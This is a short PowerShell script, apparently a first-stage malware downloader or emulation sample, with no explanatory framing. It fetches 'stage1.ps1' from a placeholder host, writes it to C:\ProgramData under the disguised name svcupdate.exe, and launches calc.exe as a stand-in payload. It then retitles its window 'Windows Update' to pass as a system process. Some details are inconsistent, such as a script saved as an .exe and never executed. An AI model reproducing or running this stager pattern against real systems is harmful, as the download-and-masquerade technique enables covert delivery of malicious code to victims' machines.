
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$Stage1Url = "http://contoso.com:80/stage1.ps1",
    [string]$OutputPath = "C:\ProgramData\svcupdate.exe",
    [int]$StageTimeout = 172
)
$ErrorActionPreference = "Stop"

function Invoke-StageDownload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Beginning first stage"
$ResultObject = Invoke-StageDownload -SourceUrl $Stage1Url -DestinationPath $OutputPath -TimeoutSec $StageTimeout
if ($ResultObject) {
    Start-Process -FilePath "calc.exe"
}
$Host.UI.RawUI.WindowTitle = "Windows Update"
